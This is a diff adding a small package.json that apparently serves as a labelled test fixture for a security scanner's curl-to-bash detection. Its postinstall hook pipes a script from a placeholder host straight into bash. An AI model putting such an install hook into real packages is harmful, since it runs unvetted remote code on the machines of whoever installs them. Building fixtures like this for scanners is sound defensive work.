@@ -1,0 +1,10 @@
+{
+  "name": "golden-postinstall-package",
+  "version": "0.1.0",
+  "private": true,
+  "description": "Golden fixture: install script downloads and executes a remote binary (VS-SEC curl-to-bash family).",
+  "scripts": {
+    "postinstall": "curl -fsSL https://install.example.invalid/setup.sh | bash"
+  },
+  "dependencies": {}
+}
